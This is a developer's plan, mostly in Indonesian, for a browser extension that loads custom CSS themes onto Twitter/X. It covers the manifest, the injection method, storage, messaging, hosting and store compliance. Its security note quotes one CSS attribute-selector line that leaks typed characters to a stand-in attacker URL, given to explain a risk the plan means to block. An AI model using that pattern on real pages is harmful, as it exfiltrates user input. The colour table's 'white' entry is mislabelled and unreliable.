# PLAN: XStyler — Twitter Theme Executor

## KONSEP
Ekstensi browser yang berfungsi sebagai "theme loader/executor" untuk Twitter/X.
- Ekstensi bikin 1 tema default (Neo-Brutalism) **bundled** di dalam package (sebagai fallback + buat FOUC-free guarantee)
- User bisa import tema .css lain via popup → simpen ke storage → apply
- Ekstensi inject CSS tersebut ke twitter.com/x.com
- User bisa ganti tema kapan saja tanpa install ekstensi baru
- Saat install pertama, ekstensi pakai tema default bundled. Saat online, background coba fetch versi terbaru dari `xstyler.ryanprayoga.dev` → kalau ada update, apply. Kalau gagal, tetep pakai bundled.
- User-imported CSS disimpan local di `chrome.storage.local` (ngak pernah dikirim ke server).

## KEPUTUSAN FINAL (revised 2026-06-20, verified via librarian research)
1. **Nama ekstensi**: `XStyler` (display name di manifest). Catatan: ada extension live "X STYLER" di Chrome Web Store + Firefox (developer `mujahidmaqbool`, 7 users, font-focused). Risk Google/Mozilla reject karena name collision. Kalau reject, fallback ke "XStyler for Twitter".
2. **Subdomain landing**: `xstyler.ryanprayoga.dev`
3. **Hosting landing**: VPS Oracle (existing) + Caddy + Cloudflare tunnel. Static files di `/var/www/xstyler.ryanprayoga.dev`. Bukan anon — attached ke identitas ryanprayoga.
4. **Tema default pertama**: `Neo-Brutalism` — **bundled** di `extension/default-themes/neo-brutalism.css` + optional remote fetch buat update dari `https://xstyler.ryanprayoga.dev/default-theme.css`.
5. **Stack**: Vanilla JS (ES modules), Chrome Extension Manifest V3, HTML+CSS+JS (no framework, no CDN).
6. **Storage**: `chrome.storage.local` (10MB default, cukup buat ~500 tema CSS). **TIDAK pakai `unlimitedStorage`** — ngak butuh, simplify permission review.
7. **FOUC mitigation**: tema default bundled di-inline sebagai string const di `content.js`, inject langsung saat `document_start` sebelum `chrome.storage.local.get` (async). Tema user-imported tetep FOUC (acceptable, documented limitation).
8. **Messaging pattern**: `chrome.tabs.sendMessage` dari SW ke content script **ngak reliable** (error "Receiving end does not exist" kalau CS belum loaded). Pattern: content script baca storage saat load sebagai source of truth. SW kirim message sebagai optimization, `.catch(() => {})` buat swallow error. **Storage = source of truth, message = optimization.**

## FASE 1: EKSTENSI DASAR (CURRENT)
Bikin ekstensi yang bisa:
1. Load file CSS dari lokal (file picker)
2. Inject CSS ke twitter.com dan x.com (FOUC-free buat tema default, FOUC acceptable buat tema user-imported)
3. Toggle on/off tema yang aktif (single active theme — radio button behavior)
4. Simpen tema yang sudah di-import ke `chrome.storage.local`
5. Bundled tema default Neo-Brutalism + optional remote fetch update saat `onInstalled`

### Struktur Folder Ekstensi
```
extension/
├── manifest.json                    # Manifest V3 config
├── background.js                     # Service worker (top-level listeners, onInstalled, storage.onChanged broadcaster)
├── content.js                        # Content script (inline default CSS, adoptedStyleSheets injection, storage read, message listener)
├── popup.html                        # UI popup saat klik icon ekstensi
├── popup.css                         # Style popup
├── popup.js                          # Logic popup (import, toggle, list tema, parse metadata)
├── default-themes/
│   └── neo-brutalism.css             # Tema default bundled (juga di-inline di content.js buat FOUC-free)
└── icons/
    ├── icon16.png
    ├── icon48.png
    └── icon128.png
```

### manifest.json (final spec)
```json
{
  "manifest_version": 3,
  "name": "XStyler",
  "version": "1.0.0",
  "description": "Import dan apply tema CSS ke Twitter/X. Ekstensi kosong — lu yang kontrol temanya.",
  "permissions": ["storage"],
  "host_permissions": [
    "https://twitter.com/*",
    "https://x.com/*",
    "https://xstyler.ryanprayoga.dev/*"
  ],
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'self'; connect-src 'self' https://xstyler.ryanprayoga.dev"
  },
  "background": {
    "service_worker": "background.js",
    "type": "module"
  },
  "content_scripts": [
    {
      "matches": ["https://twitter.com/*", "https://x.com/*"],
      "js": ["content.js"],
      "run_at": "document_start",
      "all_frames": false
    }
  ],
  "action": {
    "default_popup": "popup.html",
    "default_icon": {
      "16": "icons/icon16.png",
      "48": "icons/icon48.png",
      "128": "icons/icon128.png"
    }
  }
}
```

**Catatan permission:**
- `storage`: wajib buat nyimpen tema via `chrome.storage.local` (10MB default, cukup buat ~500 tema).
- `host_permissions`:
  - `https://twitter.com/*` + `https://x.com/*` — buat content script injection. Pakai `https://` (bukan `*://`) karena Twitter HTTPS-only, lebih sempit = lebih aman dari policy review.
  - `https://xstyler.ryanprayoga.dev/*` — wajib buat `fetch()` dari service worker ke endpoint update tema. MV3 SW `fetch()` butuh origin tujuan di `host_permissions`.
- `content_security_policy.extension_pages`: tambah `connect-src 'self' https://xstyler.ryanprayoga.dev` biar SW bisa fetch tanpa kena CSP block.
- **JANGAN pakai `activeTab`** — ngak cukup buat auto-inject di page load (cuma temporary grant on user gesture).
- **JANGAN pakai `unlimitedStorage`** — 10MB default cukup. Request permission yang ngak dibutuhin = violation "excessive permissions".
- **JANGAN pakai `scripting` permission** — content script + `adoptedStyleSheets`/`<style>` manipulation cukup buat MVP. `chrome.scripting.insertCSS` cuma buat static bundled CSS, bukan user-provided CSS (alasannya: `removeCSS` butuh exact string match yang fragile).
- **JANGAN pakai `tabs` permission** — `host_permissions` udah cukup buat `chrome.tabs.query({url: ...})`.
- **JANGAN pakai `offscreen`** — overkill buat CSS injection.

### Strategi Injection CSS (FINAL — verified via Stylus + DarkReader production pattern)
**Sumber**: Stylus HEAD 2026-06-20, DarkReader, Chrome Extensions official docs.

**Metode**: Content script + `document.adoptedStyleSheets` (CSSStyleSheet constructable) + fallback `<style>` element.

**Verifikasi production**:
- Stylus pakai `adoptedStyleSheets` dengan comment eksplisit "switched to document.adoptedStyleSheets due to strict CSP" (`src/content/style-injector.js#L318-L322`)
- DarkReader pakai `new CSSStyleSheet()` di `src/inject/dynamic-theme/adopted-style-manager.ts#L29-L34`
- Stylus fallback ke `<style>` element (BUKAN `chrome.scripting.insertCSS`) kalau `adoptedStyleSheets` ngak support

**Kenapa ngak pakai `chrome.scripting.insertCSS`?**
- `removeCSS()` butuh **exact byte match** antara `css`/`files`/`origin` yang di-insert dan di-remove. Kalau user edit CSS 1 karakter, `removeCSS` dengan string lama = no-op, style lama bocor.
- Service worker bisa cold-start saat tab load → race condition dengan page render → FOUC.
- Update CSS in-place musti `removeCSS` + `insertCSS` → ada flicker.

**Kenapa `adoptedStyleSheets`?**
- Toggle off = splice dari array (atomic, ngak ada DOM mutation)
- Update CSS = `sheet.replaceSync(newCss)` (in-place, no flicker)
- Tahan ke SPA mutation (element `<style>` di `<head>` bisa kehapus kalau Twitter render ulang; `adoptedStyleSheets` array di document object lebih stabil)

**Fallback** (kalau browser ngak support Constructable Stylesheets): `<style class="xstyler-theme-{id}">` appended to `document.documentElement`, toggle = `el.remove()`, update = `el.textContent = newCss`.

### FOUC Mitigation (FINAL — verified)
**Masalah**: `run_at: document_start` inject script sebelum DOM parse, TAPI `chrome.storage.local.get()` tetep async. Selama menunggu storage, page udah render pakai Twitter default style → FOUC terjadi. (Verified: Stylus pakai RootObserver + RewriteObserver; DarkReader pakai `watchUsingRAF` polling loop.)

**Solusi**:
1. **Tema default bundled di-inline sebagai string const di `content.js`**. Inject langsung saat `document_start` sebelum `chrome.storage.local.get()`. Ini **FOUC-free guarantee buat tema default** (Neo-Brutalism).
2. Setelah inline inject, baca `chrome.storage.local` buat tau tema aktif user. Kalau tema aktif = default, ngak ada perubahan (sudah di-apply). Kalau tema aktif = user-imported, replace via `sheet.replaceSync(userCss)`. Transisi mungkin ada flash (acceptable).
3. Untuk tema user-imported: FOUC unavoidable di first load (harus baca storage dulu). Document sebagai known limitation di README.
4. **`MutationObserver`** di `document.documentElement` buat re-inject kalau Twitter ngerender ulang dan hapus style. (Pattern dari Stylus RootObserver.)

### Storage Schema (`chrome.storage.local`)
```typescript
// Per-theme entry — key: `theme:${id}`
{
  id: string;              // uuid v4
  name: string;            // dari /* theme-name: ... */ atau fallback ke filename
  author: string;          // dari /* theme-author: ... */ atau "unknown"
  description: string;     // dari /* theme-description: ... */ atau ""
  css: string;             // raw CSS content (bisa 10-20 KB per tema)
  isDefault: boolean;      // true kalau tema dari bundled default
  isRemote: boolean;       // true kalau tema dari remote fetch update
  createdAt: number;       // Unix timestamp ms
  updatedAt: number;
}

// Index — ordered list of theme IDs
"theme:index": string[];

// User preferences (kecil — opsional bisa mirror ke chrome.storage.sync)
"prefs:global": {
  activeThemeId: string | null;  // null = no theme active. Single active theme, derive dari sini (ngak ada field 'enabled' per tema)
};
```

**Catatan**:
- **Ngak ada field `enabled` per tema** — redundant dengan `prefs:activeThemeId`. Single active theme (radio button behavior). Tema aktif = `theme.id === prefs.activeThemeId`.
- **Hybrid sync/local** (opsional, Fase 2): `prefs:global` bisa di-mirror ke `chrome.storage.sync` (< 8 KB, aman) biar preferensi ikut user antar device. CSS tetep di `local`. Stylus drop `sync` di MV3 manifest; DarkReader pakai chunked `sync` buat settings. Buat MVP: local only.

### Format File Tema (.css)
```css
/* theme-name: Neo-Brutalism */
/* theme-author: Ryan Prayoga */
/* theme-description: Loud. Raw. Unapologetic. Hard shadows, thick black borders, saturated color blocks. */
/* theme-version: 1.0.0 */
/* theme-recommended-twitter-theme: Lights Out (Dark) */

body {
  background-color: #FFFDF5 !important;
  color: #000 !important;
}

/* Target Twitter inline styles (HARDCODED RGB — Twitter ngak expose CSS variables) */
[style*="color: rgb(29, 155, 240)"]:not([style*="background-color: rgb(29, 155, 240)"]) {
  color: #FF4757 !important;
}

/* Target stable data-testid attributes */
[data-testid="tweetButton"] {
  background-color: #FECA57 !important;
  border: 3px solid #000 !important;
  box-shadow: 4px 4px 0 0 #000 !important;
}
```

**⚠️ KOREKSI PENTING soal Twitter CSS:**
Twitter/X **NGAK expose CSS variables** seperti `--primary-color`. PLAN.md versi sebelumnya salah di bagian ini. Twitter pakai:
1. **Inline `style="color: rgb(29, 155, 240)"`** — hardcoded RGB values. Override via `[style*="color: rgb(29, 155, 240)"]`.
2. **`.r-*` class names** — obfuscated atomic classes (`.r-kemksi`, `.r-1igl3o0`, dll). Bisa berubah tiap deploy Twitter. Pakai `!important` + dokumentasikan mungkin break.
3. **`data-testid="..."` attributes** — STABIL, ini hook utama. Contoh: `[data-testid="primaryColumn"]`, `[data-testid="tweet"]`, `[data-testid="tweetButton"]`, `[data-testid="sidebarColumn"]`.

**Prioritas selector** (dari paling stabil ke paling fragile):
1. `data-testid` — wajib dipakai semaksimal mungkin
2. `[style*="rgb(...)"]` — stabil selama Twitter ngak ganti warna literal
3. `.r-*` — pakai cuma kalau `data-testid` ngak nyamak, pair dengan `!important`

**Known Twitter RGB values** (verifikasi berkala — Twitter bisa update):
| RGB | Semantik |
|---|---|
| `rgb(29, 155, 240)` | Twitter blue (text, button bg, link) |
| `rgb(239, 243, 24)` | White text (dark mode) |
| `rgb(113, 118, 123)` | Secondary gray text |
| `rgb(249, 24, 128)` | Like/heart pink |
| `rgb(0, 186, 124)` | Retweet green |

**Referensi implementation** (repositori yang sudah prove pola ini):
- `catppuccin/userstyles` — twitter userstyle 935 baris, MIT, update bulanan. Sumber paling lengkap selector Twitter.
- `typefully/minimal-twitter` — Chrome extension 6k+ users, pattern `data-testid` + media query.
- `dimdenGD/OldTwitter` — Chrome extension 100k+ users, MV3, x.com domain, `run_at: document_start`.
- `Ablaze-MIRAI/Twitter-UI-Customizer` — full customization extension, pattern attribute toggle.

### Metadata Parsing (di `popup.js` saat import)
- Parse via regex: `/\/\*\s*theme-([\w-]+):\s*(.+?)\s*\*\//g` (note: `[\w-]+` bukan `\w+` biar catch `theme-recommended-twitter-theme`)
- Kalau `theme-name` ngak ada: fallback ke filename tanpa `.css` extension
- Kalau `theme-author` ngak ada: default `"unknown"`
- Kalau `theme-description` ngak ada: default `""`
- Field lain (`theme-version`, `theme-recommended-twitter-theme`) opsional, simpen kalau ada

### Messaging Pattern (FINAL — verified)
**Masalah**: `chrome.tabs.sendMessage` dari SW ke content script **ngak reliable**:
- Content script belum loaded saat `onInstalled` fires di SW (extension baru install, tab Twitter udah kebuka)
- Tab navigasi ke URL di luar `content_scripts.matches` (chrome://, about:blank)
- Tab closed antara `tabs.query` dan `sendMessage`
- Content script crashed

**Pattern production** (DarkReader, kiss-translator, Screenity):
```javascript
// Di background.js — fire-and-forget dengan error swallow
chrome.tabs.query({url: ['https://twitter.com/*', 'https://x.com/*']}, (tabs) => {
  for (const tab of tabs) {
    chrome.tabs.sendMessage(tab.id, msg).catch(() => {
      // "Receiving end does not exist" — content script belum loaded/ndak ada
      // No-op, content script akan baca storage sendiri saat load
    });
  }
});
```

**Prinsip**: **Storage = source of truth. Message = optimization.**
- Content script baca `chrome.storage.local` saat load (di `document_start`) → apply tema aktif tanpa nungu message dari SW
- SW kirim message sebagai optimization biar tema apply cepet tanpa reload page
- Kalau message gagal (CS belum loaded), ngak masalah — CS akan baca storage sendiri di next load

### `storage.onChanged` Listener Pattern (FINAL — verified)
**Verified**: `chrome.storage.onChanged` fires reliably di MV3 SW. Event queued dan wake SW kalau lagi idle. TAPI:
- Listener **HARUS registered top-level synchronous** di `background.js`, BUKAN di dalam `chrome.runtime.onInstalled` callback atau async IIFE
- SW akan auto-restart kalau idle 30 detik, listener di-re-register saat SW start

```javascript
// background.js — TOP LEVEL (bukan di dalam callback)
chrome.storage.onChanged.addListener((changes, areaName) => {
  if (areaName !== 'local') return;
  for (const [key, {oldValue, newValue}] of Object.entries(changes)) {
    if (key === 'prefs:global' || key.startsWith('theme:')) {
      broadcastToTwitterTabs({type: 'STORAGE_CHANGED', key, oldValue, newValue});
    }
  }
});

async function broadcastToTwitterTabs(msg) {
  const tabs = await chrome.tabs.query({url: ['https://twitter.com/*', 'https://x.com/*']});
  for (const tab of tabs) {
    chrome.tabs.sendMessage(tab.id, msg).catch(() => {});  // fire-and-forget
  }
}
```

### Remote Fetch Update Tema Default (FINAL — policy compliant)
**Policy concern**: Chrome Web Store MV3 policy bilang "remote resources must not contain any logic". CSS agak gray area (declarative, no control flow, tapi bisa dipake buat CSS exfil). Librarian rekomendasi: **bundle default sebagai fallback + remote fetch optional buat update**.

**Alur**:
1. Ekstensi bundle `extension/default-themes/neo-brutalism.css` (v1.0.0) — ini yang di-review Chrome Web Store
2. `extension/default-themes/neo-brutalism.css` juga di-inline sebagai string const di `content.js` buat FOUC-free guarantee
3. Saat `chrome.runtime.onInstalled` (atau `onStartup`), SW coba fetch `https://xstyler.ryanprayoga.dev/default-theme.css`:
   - Bandingkan `theme-version` header dengan versi bundled
   - Kalau versi remote > bundled, simpen ke storage sebagai `theme:${uuid}` dengan `isRemote: true`, `isDefault: true`
   - Kalau fetch gagal (offline, server down), tetep pakai bundled — ekstensi jalan normal
4. Remote fetch **strictly optional** — ekstensi 100% functional tanpa network. Cuma buat update tema default tanpa push update extension (Chrome Web Store review 1-3 hari).

**Cara inject CSS dari remote fetch** (policy compliant):
- ❌ JANGAN: `element.innerHTML = remoteCss`, `eval()`, `new Function(remoteCss)`, `@import url(remote)`
- ✅ PAKAI: `sheet.replaceSync(remoteCss)` atau `element.textContent = remoteCss` — treat CSS sebagai data, bukan code

### Alur Kerja Ekstensi
1. **Install pertama** → `chrome.runtime.onInstalled` fires di background.js:
   - Inject tema default bundled ke storage sebagai `theme:${uuid}` dengan `isDefault: true`
   - Set `prefs:activeThemeId` = uuid tema tadi
   - Content script (sudah jalan di tab yang kebuka) baca storage → apply tema
   - **Async**: coba fetch `https://xstyler.ryanprayoga.dev/default-theme.css`. Kalau ada update versi, update storage. Kalau gagal, no-op.
2. **User klik icon ekstensi** → popup muncul:
   - Popup baca `chrome.storage.local` → tampilkan list tema
   - Tema aktif (`prefs:activeThemeId`) di-highlight (radio button behavior)
   - Tombol "Import Theme" → file picker `.css` → parse metadata → simpen ke storage → set sebagai active
   - Tombol "Remove" per tema → hapus dari storage → kalau tema yang dihapus adalah active, set `prefs:activeThemeId = null` + remove dari page
3. **User toggle tema aktif** (klik tema lain di list):
   - Popup update `prefs:activeThemeId` di storage
   - `storage.onChanged` fires di background.js → broadcast message ke semua tab Twitter
   - Content script terima message → `sheet.replaceSync(newCss)` (kalau sheet udah ada) atau push `adoptedStyleSheets` baru
4. **Tab Twitter load/reload**:
   - Content script jalan di `document_start`
   - **Inline default CSS langsung** (FOUC-free buat tema default)
   - Baca `prefs:activeThemeId` dari storage → baca `theme:${id}.css` → kalau beda dari default, `sheet.replaceSync(userCss)`
   - Register `MutationObserver` di `document.documentElement` buat re-inject kalau dihapus

### Single Active Theme (Radio Button Behavior)
**Decided**: cuma 1 tema aktif per waktu. Alasan:
- Multiple concurrent themes = CSS conflict risk (dua tema override `body { background }` → ngak predictable mana yang menang)
- UX simpel: user klik tema → tema itu aktif, tema lain otomatis off
- Kalau user mau combine tema, mereka bisa bikin 1 tema gabungan manual (out of scope Fase 1)

## FASE 2: LANDING PAGE
- Gallery tema yang bisa di-download (.css files)
- Endpoint `https://xstyler.ryanprayoga.dev/default-theme.css` → serve file `neo-brutalism.css` versi terbaru (buat auto-fetch ekstensi)
- Privacy policy page di `/privacy` (WAJIB buat Chrome Web Store submission)
- Download ekstensi (.zip siap load-unpack)
- Cara install (Load unpacked / Chrome Web Store link kalau udah publish)
- Upload/share tema — **DEFERRED ke Fase 3 atau v2** (sharing = UGC moderation regime, butuh content moderation mechanism)
- Screenshot/preview tema (screenshot Twitter dengan tema applied)

### Struktur Folder Landing + Build Flow
```
twitter-theme-executor/                # Root repo
├── extension/                          # Source code ekstensi (yang di-develop)
│   ├── manifest.json
│   ├── background.js
│   ├── content.js
│   ├── popup.html
│   ├── popup.css
│   ├── popup.js
│   ├── default-themes/
│   │   └── neo-brutalism.css
│   └── icons/
├── landing/                            # Landing page (static, di-deploy ke VPS)
│   ├── index.html
│   ├── gallery.html
│   ├── privacy.html                    # Privacy policy (WAJIB)
│   ├── style.css
│   ├── script.js
│   ├── themes/                         # File tema .css yang bisa di-download
│   │   ├── neo-brutalism.css           # Versi terbaru (juga served di /default-theme.css)
│   │   └── ...
│   ├── extension/                      # Zip ekstensi siap download
│   │   └── xstyler-v1.0.0.zip          # Build artifact (gitignored, generated by build script)
│   ├── assets/                         # Screenshot, preview image
│   └── install.html                    # Cara install (Load unpacked steps)
├── scripts/
│   └── build-extension.sh              # Zip extension/ → landing/extension/xstyler-v{version}.zip
├── PLAN.md
└── README.md
```

**Build flow**:
1. Edit source di `extension/`
2. Jalankan `scripts/build-extension.sh`:
   - Baca `version` dari `extension/manifest.json`
   - Zip `extension/` (exclude `.DS_Store`, dst) → `landing/extension/xstyler-v{version}.zip`
3. Deploy `landing/` ke VPS: `scp -r landing/* vps:/var/www/xstyler.ryanprayoga.dev/`
4. User download zip dari landing page → unzip → Load unpacked di `chrome://extensions`

### Caddy Config (di VPS)
```caddyfile
xstyler.ryanprayoga.dev {
    root * /var/www/xstyler.ryanprayoga.dev
    encode zstd gzip

    # Auto-fetch endpoint buat ekstensi — serve neo-brutalism.css versi terbaru
    handle /default-theme.css {
        rewrite * /themes/neo-brutalism.css
        file_server
        header Content-Type text/css
        header Access-Control-Allow-Origin *  # CSS publik, CORS bebas
        header Cache-Control "no-cache"       # ekstensi selalu cek versi terbaru
    }

    # Download .css dan .zip dengan Content-Disposition attachment
    @downloads path /themes/*.css /extension/*.zip
    header @downloads Content-Disposition attachment

    try_files {path} /index.html
    file_server
}
```

**Catatan CORS**: `Access-Control-Allow-Origin *` aman untuk file CSS publik (ngak ada data sensitif). Ekstensi fetch dari SW context dengan `host_permissions` yang udah declare `xstyler.ryanprayoga.dev`, jadi CORS ngak masalah.

## FASE 3: THEME BUILDER (WEB)
- Form di landing page: pilih warna, font, border style, shadow style
- Generate .css file yang bisa di-download
- Preview real-time (iframe Twitter dummy atau screenshot service)
- **Upload/share tema ke gallery** — di Fase 3 ini baru activate. Butuh:
  - Content moderation mechanism (review queue, report button, takedown process)
  - Privacy policy update (UGC handling)
  - Sanitasi CSS: strip `url()` ke domain whitelist (twitter.com, twimg.com, xstyler.ryanprayoga.dev) buat prevent CSS exfil
- **Chrome Web Store policy**: activate sharing = activate UGC moderation regime. Plan compliance review ulang sebelum ship Fase 3.

## TIMELINE
1. **Fase 1 (Ekstensi dasar)**: 3-4 hari (termasuk FOUC handling via inline default, adoptedStyleSheets, remote fetch update, metadata parsing, popup UI, MutationObserver)
2. **Fase 2 (Landing page)**: 2-3 hari (static HTML, gallery, privacy policy page, serve default-theme.css, build script, deploy ke VPS)
3. **Fase 3 (Theme builder + sharing)**: 4-5 hari (form, generator CSS, preview, content moderation mechanism, CSS sanitization)

Total: 9-12 hari kerja.

## TECH STACK
- **Ekstensi**: Vanilla JS (ES modules), Chrome Extension Manifest V3, `chrome.storage.local` (10MB, no `unlimitedStorage`)
- **Landing page**: HTML + CSS + JS (no framework, no CDN — hardcoded rule)
- **Hosting**: VPS Oracle (existing) + Caddy + Cloudflare tunnel + `/var/www/xstyler.ryanprayoga.dev`
- **Tema default pertama**: Neo-Brutalism (novel — belum ada di GitHub manapun per 2026-06-20)

## SECURITY NOTE
User import CSS arbitrary → CSS ngak bisa execute JS, TAPI `url()` di CSS bisa dipake buat exfil data via attribute selectors (misal: `input[value^="a"] { background: url('https://attacker.com/log?char=a') }`). Buat MVP ini low-risk (user import sendiri), tapi:
- **Fase 1**: tambahin warning di popup sebelum apply tema dari source unknown: "Hanya import tema dari sumber yang dipercaya."
- **Fase 3** (saat sharing activate): wajib sandbox/strip `url()` ke domain whitelist (twitter.com, twimg.com, xstyler.ryanprayoga.dev), atau warning lebih aggressive.

## BACKUP / FALLBACK KEPUTUSAN
- Kalau Google Chrome Web Store reject nama "XStyler" karena collision sama "X STYLER" (extension `mujahidmaqbool`): fallback display name ke **"XStyler for Twitter"**.
- Kalau `adoptedStyleSheets` ngak support di browser target: fallback ke `<style class="xstyler-theme-{id}">` element + `textContent` update.
- Kalau auto-fetch `default-theme.css` gagal saat `onInstalled` (offline, server down): ekstensi tetep jalan pakai bundled default. User ngak sadar ada failure.
- Kalau `chrome.tabs.sendMessage` gagal ("Receiving end does not exist"): swallow error, content script akan baca storage sendiri di next load.

## CHROME WEB STORE COMPLIANCE CHECKLIST

### Pre-submission (architecture)
- [ ] Default theme CSS bundled di `extension/default-themes/neo-brutalism.css` (di-review Chrome Web Store)
- [ ] Remote CSS fetch (optional update) via `sheet.replaceSync(remoteCss)` atau `element.textContent` — never `eval`, `innerHTML`, `@import url(remote)`
- [ ] User-imported CSS stored in `chrome.storage.local` only — no server upload, no theme gallery in v1
- [ ] `unlimitedStorage` NOT requested (10MB local cukup)
- [ ] `host_permissions` sempit: `https://twitter.com/*`, `https://x.com/*`, `https://xstyler.ryanprayoga.dev/*` (no `*://`, no `<all_urls>`)
- [ ] `content_security_policy.extension_pages` allows `connect-src 'self' https://xstyler.ryanprayoga.dev`
- [ ] No `@import url(remote)` inside any CSS file (bundled atau user-imported)

### Privacy & data
- [ ] Privacy policy hosted at `xstyler.ryanprayoga.dev/privacy`
- [ ] Privacy policy states: data stored (user-imported CSS, theme prefs), location (`chrome.storage.local`, never transmitted), no sharing, contact email
- [ ] Privacy policy includes verbatim Limited Use affirmation: "The use of information received from Google APIs will adhere to the Chrome Web Store User Data Policy, including the Limited Use requirements."
- [ ] Privacy policy URL entered in designated dashboard field (NOT in description)
- [ ] Privacy Practices tab: every permission justified (`storage`, host_permissions)
- [ ] Privacy Practices tab: Limited Use certification checkboxes checked
- [ ] "No data collection" / "No analytics" accurately reflected in data-usage disclosures

### Listing metadata (disclosure)
- [ ] Description explicitly states: "injects custom CSS into twitter.com and x.com to restyle the interface"
- [ ] Screenshots show modified X/Twitter UI (before/after ideal)
- [ ] No implication of X Corp / Twitter endorsement; no Twitter/X logo as extension icon
- [ ] 128×128, 48×48, 16×16 icons present
- [ ] Screenshots are 1280×800

### Code quality
- [ ] No obfuscation (minification OK)
- [ ] No `eval()`, no remote `<script>` tags, no interpreter patterns
- [ ] All dependencies bundled locally (no CDN `<script>` refs)
- [ ] Packed `.crx` tested locally — popup opens, themes apply, remote fetch (optional) succeeds

### Account
- [ ] 2-Step Verification enabled on the Google account that owns the developer account
- [ ] Developer account in good standing

### Submission form
- [ ] Permissions justification filled out for: `storage`, host permissions for twitter.com/x.com/xstyler.ryanprayoga.dev
- [ ] Test instructions provided (reviewer perlu tau buka twitter.com setelah install)
- [ ] Distribution set to Public (or Unlisted if preferred)
